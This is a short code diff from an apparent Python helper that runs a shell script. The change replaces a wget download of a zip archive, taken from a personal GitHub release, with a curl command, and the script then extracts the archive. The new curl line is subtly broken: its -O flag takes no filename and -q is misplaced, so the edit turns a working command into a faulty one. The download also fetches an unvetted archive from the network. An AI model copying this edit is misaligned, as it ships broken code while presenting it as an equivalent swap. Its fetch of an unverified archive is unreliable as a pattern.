@@ -22,7 +22,7 @@ def run_script():
     set -e
 
     echo "=== DOWNLOAD FILE ==="
-    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip
+    curl -sL -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip
 
     echo "=== EXTRACT ==="
     unzip -o pan.zip
